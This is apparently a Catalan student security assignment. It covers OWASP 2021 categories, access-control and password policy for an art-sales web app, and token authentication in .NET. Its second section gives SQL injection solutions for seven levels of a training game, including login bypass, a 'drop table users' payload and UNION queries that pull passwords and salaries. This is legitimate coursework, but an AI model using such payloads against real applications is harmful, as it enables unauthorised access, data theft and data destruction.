# T1. PR1. Seguretat i vulnerabilitat

## **1. L’organització OWASP Foundation va actualitzar en 2021 el seu Top 10 de vulnerabilitats més trobades en aplicacions web.**

**1 - A07:2021 – Fallas de Identificación y Autenticación**

Son falles en la confirmacio de la identitat, la autenticacio i en la gestio de sesions dels usuaris.

Permet atacs automatitzats com la reutilització de credencials conegudes, on l'atacant té una llista de parells d'usuari i contrasenya vàlids. 

Exposa l'identificador de sessió a la URL.

Emmagatzema les contrasenyes en text clar, xifrades o utilitzant funcions de hash febles.

Mesures i tecniques per prevencio:

  1. Implementeu un control contra contrasenyes febles, tal com verificar que una nova contrasenya o la utilitzada en el canvi de contrasenya no estigui inclosa a la llista de les 10,000 pitjors contrasenyes.

  2. Quan sigui possible, implementeu l'autenticació multifactor per evitar atacs automatitzats de reutilització de credencials conegudes, força bruta i reús de credencials robades.

  3. Assegureu-vos que el registre, la recuperació de les credencials i l'ús d'APIs no permeten els atacs d'enumeració d'usuaris mitjançant la utilització dels mateixos missatges genèrics a totes les sortides.

**2 - A10:2021 – Falsificación de Solicitudes del Lado del Servidor (SSRF)**

Les falles de SSRF tenen lloc quan una aplicació web està obtenint un recurs remot sense validar l'URL proporcionada per l'usuari. Permet que un atacant coaccioni a l'aplicació perquè enviï una sol·licitud falsificada a una destinació inesperada.

Mesures i tecniques per prevencio:

  1. Segmenteu la funcionalitat d'accés a recursos remots en xarxes separades per reduir l'impacte de SSRF

  2. Feu complir les polítiques de tallafocs "denegar per defecte" o les regles de control d'accés a la xarxa per bloquejar tot el trànsit de la intranet excepte l'essencial.

  3. Deshabiliteu les redireccions HTTP

**3 - A06:2021 – Componentes Vulnerables y Desactualizados**

Els components vulnerables són un problema conegut que és difícil de provar i avaluar el risc. És l'única categoria que no té enumeracions de debilitats comunes (CWE) assignades a les CWE incloses, per la qual cosa es fa servir un pes d'impacte/exploits predeterminat de 5,0.

Si els desenvolupadors de programari no testegen la compatibilitat de les biblioteques actualitzades, actualitzades o pegats.

Si no repara o actualitza la plataforma subjacent, frameworks i dependències de manera oportuna i basada en el risc.

Si el programari és vulnerable, no té suport o no està actualitzat. Això inclou el sistema operatiu, el servidor web/d'aplicacions, el sistema d'administració de bases de dades (DBMS), les aplicacions, les API i tots els components, els entorns d'execució i les biblioteques.

Mesures i tecniques per prevencio:

  1. Elimineu les dependències que no són utilitzades, funcionalitats, components, arxius i documentació innecessaris.

  2. Només obtingueu components de fonts oficials a través d'enllaços segurs. Preferiu els paquets signats per reduir la possibilitat d'incloure un component maliciós modificat

  3. Realitzeu un inventari continu de les versions dels components al client i al servidor (per exemple, frameworks, biblioteques) i les seves dependències utilitzant eines com: versions, OWASP Dependency Check, retire.js, etc.

## **2. Obre el següent enllaç (sql inseckten) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL.**

  1. level 1:
     ```
     SELECT username 
     FROM users 
     WHERE username ='jane' --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
     ```
  2. level 2:
     ```
     SELECT username 
     FROM users 
     WHERE username =''; drop table users;' AND password ='d41d8cd98f00b204e9800998ecf8427e';
     ```
  3. level 3:
     ```
     SELECT username 
     FROM users 
     WHERE username ='' or 1=1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
     ```
  4. level 4:
     ```
     SELECT username 
     FROM users 
     WHERE username ='' OR 1=1 ORDER BY username LIMIT 1 --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
     ```
  5. level 5:
     ```
     SELECT product_id, brand, size, price 
     FROM shoes 
     WHERE brand=''; select user_id,username,password,email from users; -';
  6. level 6:
     ```
     SELECT username 
     FROM users 
     WHERE username ='' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';
     ```
  7. level 7:
     ```
     SELECT product_id, brand, size, price 
     FROM shoes 
     WHERE brand='' UNION SELECT name, firstname, email, salary, employed_since FROM staff --';
     ```
## **3.L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.**

Definició del control d’accés
Per implementar un sistema segur, es defineixen els següents rols i permisos:

Client:

Accés: Pot veure obres d'art, comprar-les i escriure ressenyes públiques sobre els artistes.

Restriccions: No pot accedir a dades sensibles d'altres usuaris ni gestionar obres d'art.

Artista:

Accés: Pot registrar-se, pujar obres amb fotografies, títols, descripció i preus. També pot consultar les seves vendes i ressenyes.

Restriccions: No pot accedir a dades personals o bancàries d'altres usuaris.

Account Manager:

Accés: Pot verificar nous artistes i aprovar-los perquè puguin publicar i vendre obres.

Restriccions: No pot modificar dades bancàries dels artistes ni accedir a dades de clients.

Administrador del sistema:

Accés: Control total sobre l'aplicació, incloent-hi la gestió de dades personals i bancàries, així com la configuració de permisos.

Restriccions: Cap (però s'ha de limitar el nombre d'usuaris amb aquest rol).

Aquest model de control d'accés es basa en el principi de mínim privilegi, assegurant que cada usuari només tingui accés a les dades necessàries per a les seves funcions.

Definició de la política de contrasenyes
Les polítiques de contrasenyes es defineixen segons els següents criteris:

Normes generals
Longitud mínima de 12 caràcters.

Ha d'incloure majúscules, minúscules, números i símbols especials.

No pot contenir informació personal com noms, dates o paraules comunes.

Canvi obligatori cada 90 dies.

No reutilitzar cap de les últimes 5 contrasenyes.

Diferenciació segons perfil
Clients i artistes: Polítiques estàndard per garantir seguretat bàsica.

Account Managers i Administradors del sistema: Polítiques més estrictes, incloent-hi autenticació multifactor (MFA) per accedir al sistema.

Aquestes mesures garanteixen que els comptes siguin menys vulnerables a atacs com el phishing o la força bruta.

Avaluació de la informació
Valor de les dades
Les dades gestionades tenen un alt valor per la seva sensibilitat:

Dades personals (nom, cognoms, DNI, adreça completa): Necessàries per complir amb la normativa legal.

Dades bancàries dels artistes: Crítiques per processar pagaments.

Historial de compres i ressenyes: Dades comercials valuoses.

Tractament i encriptació
Per protegir aquestes dades:

Encriptació en repòs i en trànsit:

Utilitzar algoritmes com AES-256 per dades sensibles (dades personals i bancàries).

HTTPS per assegurar la transmissió segura.

Pseudonimització:

Separar identificadors personals de dades operatives sempre que sigui possible.

Còpies de seguretat xifrades:

Per evitar pèrdues en cas d'atacs o fallades tècniques.

Aquestes polítiques asseguren el compliment del RGPD i altres normatives aplicables.

## 4. En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.

Definició de l’autenticació basada en tokens
L’autenticació basada en tokens és un mètode de seguretat que verifica la identitat d’un usuari mitjançant l’ús de tokens encriptats. Quan un usuari inicia sessió correctament, el servidor genera un token únic que permet accedir a recursos protegits sense haver d’introduir les credencials repetidament. Aquest token es transmet entre el client i el servidor per autenticar les sol·licituds durant un període limitat de temps.

Tipus de tokens
Hi ha diferents tipus de tokens utilitzats en l’autenticació:

Tokens d’accés: Utilitzats per accedir a recursos protegits. Són opacs i segueixen el framework OAuth 2.0.

Tokens de refresc: Permeten obtenir nous tokens d’accés sense tornar a iniciar sessió. Tenen una durada més llarga.

Tokens JWT (JSON Web Tokens): Són compactes i contenen informació codificada sobre l’usuari, com ara identificadors i afirmacions (claims). Estan signats digitalment per garantir-ne la integritat.

Tokens físics o "hard tokens": Dispositius físics que generen codis únics per a l’autenticació.

Soft tokens: Aplicacions o mètodes digitals que generen els mateixos codis únics que els hard tokens.

Funcionament de l’autenticació basada en tokens a la web
El procés general inclou els següents passos:

Inici de sessió: L’usuari introdueix les seves credencials (nom d’usuari i contrasenya).

Verificació: El servidor comprova si les credencials són correctes.

Generació del token: Si les credencials són vàlides, el servidor emet un token únic signat.

Emmagatzematge del token: El client guarda el token (per exemple, al localStorage o cookies del navegador).

Ús del token: Per a cada sol·licitud futura, el client inclou el token en els encapçalaments HTTP (normalment com a "Authorization: Bearer [token]").

Validació del token: El servidor verifica la validesa del token abans de concedir accés al recurs sol·licitat.

Llibreries .NET per implementar autenticació amb tokens
A continuació es presenten algunes llibreries útils per implementar autenticació basada en tokens amb .NET:

Microsoft.Identity.Client (MSAL): Llibreria oficial per treballar amb autenticació OAuth 2.0 i OpenID Connect, utilitzada per obtenir tokens d’accés i refresc.

System.IdentityModel.Tokens.Jwt: Permet treballar amb JWT, incloent-hi la creació, validació i manipulació de tokens JWT.

IdentityServer4: Framework per implementar autenticació i autorització basades en OAuth 2.0 i OpenID Connect en aplicacions .NET.

ASP.NET Core Authentication Middleware: Proporciona suport integrat per a autenticació basada en JWT i altres esquemes.

## **5. Crea un projecte de consola amb un menú amb tres opcions:**




## **6. Indica les referències que has consultat, seguint el següent format:**

14 contribuidors - (25/10/2023) - Control de acceso basado en rol para desarrolladores de aplicaciones - Learn Microsoft - [link](https://learn.microsoft.com/es-es/entra/identity-platform/custom-rbac-for-developers)

3 contribuidors - (17/05/2024) - Autenticación de API basada en tokens - Learn Microsoft - [link](https://learn.microsoft.com/es-es/xandr/digital-platform-api/token-based-api-authentication)

Universitat Illes Balears - (no hi ha data) - Bones pràctiques Contrasenyes - Seguretat UIB - [link](https://seguretat.uib.cat/conscienciacio/bones-practiques/contrasenyes/)

Keeper - (no hi ha data) - ¿Qué es la autenticación basada en tokens? - Keeper - [link](https://www.keepersecurity.com/es_ES/resources/glossary/what-is-token-based-authentication/)

Microsoft - (no hi ha data) - RSAPKCS1SignatureDeformatter.VerifySignature(Byte[], Byte[]) Método - Learn Microsoft - [link](https://learn.microsoft.com/es-es/dotnet/api/system.security.cryptography.rsapkcs1signaturedeformatter.verifysignature?view=net-9.0)

Hector de leon - (29/12/2017) - Función para encriptar en sha256 en C# .Net - HdeLeon.net - [link](https://hdeleon.net/funcion-para-encriptar-en-sha256-en-c-net/)

Microsoft - (no hi ha data) - SHA256 Clase - Learn Mircosoft - [link](https://learn.microsoft.com/es-es/dotnet/api/system.security.cryptography.sha256?view=net-8.0)

[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/S9WTUTwx)
